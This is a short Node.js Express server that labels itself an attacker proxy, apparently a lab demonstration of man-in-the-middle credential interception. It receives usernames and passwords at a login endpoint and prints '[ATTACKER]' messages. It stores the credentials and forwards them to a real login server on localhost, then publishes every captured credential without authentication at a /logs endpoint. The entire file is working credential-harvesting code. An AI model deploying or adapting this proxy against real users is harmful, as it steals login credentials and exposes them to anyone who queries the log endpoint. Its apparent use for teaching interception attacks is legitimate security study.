const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();
const PORT = 4000;

app.use(cors());
app.use(express.json());

let interceptedLogs = [];

const REAL_SERVER_URL = 'http://localhost:3000/real-login';

app.post('/proxy-login', async (req, res) => {
    const { username, password, mode } = req.body;
    const timestamp = new Date().toLocaleString();

    const rawRequest = `POST /login username=${username}&password=${password}`;

    const logEntry = {
        username,
        password,
        mode,
        timestamp,
        rawRequest
    };
    interceptedLogs.push(logEntry);

    console.log(`[ATTACKER] Intercepted [${mode}] request at ${timestamp}`);

    try {
        const response = await axios.post(REAL_SERVER_URL, {
            username,
            password
        });

        res.json(response.data);
    } catch (error) {
        console.error('[ATTACKER] Error forwarding to real server:', error.message);
        res.status(500).json({ status: "error", message: "Real server unreachable" });
    }
});

app.get('/logs', (req, res) => {
    res.json(interceptedLogs);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`💀 Attacker Proxy Server running on http://10.0.9.144:${PORT}`);
    console.log(`- Intercepting at: /proxy-login`);
    console.log(`- Serving logs at: /logs`);
});
